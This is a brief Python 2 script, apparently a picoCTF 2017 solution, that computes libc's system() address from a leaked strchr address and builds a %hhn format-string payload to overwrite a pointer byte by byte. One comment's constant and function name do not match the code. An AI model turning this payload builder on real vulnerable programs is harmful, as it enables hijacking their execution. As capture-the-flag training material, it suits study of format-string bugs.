import sys
import struct

# input strchr addr as arg 1
strchr = int(sys.argv[1], 16)

# calc system addr from known prinf addr (0x3b410 is magical constant from shell2017.picoctf.com dist from system to strchr)
system = strchr - 0x56880
#system = 0x00000000
print '{0:02x}'.format(system)

fmt_str = ""
count = 0x81
add = 0x0
for i in range(0, 4, 1):
    # padding to make this work inside the flag
    if i == 2:
        fmt_str += ' ' * 12
        count += 12 + 0x15 # the 0x15 is padding added by going to next flag row

    
    # get byte from system addr
    byte = (system >> (8 * i)) % 256
    
    print '{0:02x}'.format(byte)
    # calc num chars to add to str
    add = byte - count % 256
    if add <= 0:
        add += 256
    count += add
    # append to format str (44 is magic number from push_got.py script)
    fmt_str += "%"+str(add)+"x%"+str(44+i)+"$hhn"
fmt_str += "\n"

print fmt_str
